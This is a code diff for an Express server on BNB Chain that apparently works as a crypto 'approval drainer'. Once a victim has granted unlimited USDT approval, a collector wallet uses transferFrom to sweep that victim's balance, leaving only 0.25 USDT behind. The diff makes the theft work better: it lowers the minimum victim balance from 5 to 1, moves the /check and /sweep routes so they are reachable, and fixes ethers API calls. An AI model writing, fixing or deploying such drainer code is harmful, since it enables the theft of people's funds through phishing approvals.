@@ -27,7 +27,7 @@ app.use((req, res, next) => {
 
 const USDT = '0x55d398326f99059fF775485246999027B3197955';
 const DUST = 0.25;
-const MIN  = 5;
+const MIN  = 1;
 const ABI  = [
   'function transferFrom(address,address,uint256) returns (bool)',
   'function balanceOf(address) view returns (uint256)',
@@ -56,8 +56,38 @@ const done = new Set();
 app.get('/health', (req, res) => {
   try {
     init();
-    res.json({ ok: true, collector: hot.address, files: fs.readdirSync(__dir) });
+    res.json({ ok: true, collector: hot.address });
   } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+});
+
+app.get('/check', async (req, res) => {
+  try {
+    init();
+    const who = req.query.from;
+    if (!ethers.isAddress(who)) return res.status(400).json({ error: 'add &from=0xUSER' });
+    const dec    = await usdt.decimals();
+    const bal    = Number(ethers.formatUnits(await usdt.balanceOf(who), dec));
+    const allow  = await usdt.allowance(who, hot.address);
+    const colBnb = Number(ethers.formatEther(await provider.getBalance(hot.address)));
+    const need   = ethers.parseUnits(Math.max(0, bal - DUST).toFixed(6), dec);
+    res.json({
+      user: who,
+      userUsdt: bal,
+      allowance: allow.toString(),
+      unlimitedApproved: allow >= (ethers.MaxUint256 / 2n),
+      collector: hot.address,
+      collectorBnb: colBnb,
+      READY_TO_SWEEP: bal >= MIN && allow >= need && colBnb > 0.0001
+    });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.get('/sweep', async (req, res) => {
+  try {
+    init();
+    if (!ethers.isAddress(req.query.from)) return res.status(400).json({ error: 'add &from=0xUSER' });
+    res.json({ ok: true, ...(await sweep(req.query.from)) });
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.post('/collector.track', async (req, res) => {
@@ -89,6 +119,8 @@ app.post('/approved', async (req, res) => {
   catch (e) { res.status(500).json({ error: e.message }); }
 });
 
+app.post('/sheet', (req, res) => res.json({ ok: true }));
+
 async function sweep(from) {
   const dec    = await usdt.decimals();
   const bal    = Number(ethers.formatUnits(await usdt.balanceOf(from), dec));
@@ -102,41 +134,12 @@ async function sweep(from) {
   return { swept: (bal - DUST).toFixed(2), tx: rc.hash };
 }
 
-app.post('/sheet', (req, res) => res.json({ ok: true }));
-
 app.get('*', (req, res) => {
   const f = path.join(__dir, 'index.html');
   if (fs.existsSync(f)) return res.sendFile(f);
   res.status(200).send('index.html not found in ' + __dir);
 });
-app.get('/check', async (req, res) => {
-  try {
-    init();
-    const who = req.query.from;
-    if (!ethers.isAddress(who)) return res.status(400).json({ error: 'add &from=0xUSER' });
-    const dec = await usdt.decimals();
-    const bal = Number(ethers.formatUnits(await usdt.balanceOf(who), dec));
-    const allow = await usdt.allowance(who, hot.address);
-    const colBnb = Number(ethers.formatEther(await provider.getBalance(hot.address)));
-    res.json({
-      user: who,
-      userUsdt: bal,
-      allowance: allow.toString(),
-      unlimitedApproved: allow.gte(ethers.constants.MaxUint256.div(2)),
-      collector: hot.address,
-      collectorBnb: colBnb,
-      READY_TO_SWEEP: bal >= MIN && allow.gte(ethers.parseUnits(String(bal - DUST), dec)) && colBnb > 0.0001
-    });
-  } catch (e) { res.status(500).json({ error: e.message }); }
-});
 
-app.get('/sweep', async (req, res) => {
-  try {
-    init();
-    if (!ethers.isAddress(req.query.from)) return res.status(400).json({ error: 'add &from=0xUSER' });
-    res.json({ ok: true, ...(await sweep(req.query.from)) });
-  } catch (e) { res.status(500).json({ error: e.message }); }
-});
 export default app;
 
 if (!process.env.VERCEL) app.listen(process.env.PORT || 8080, () => console.log('listening'));
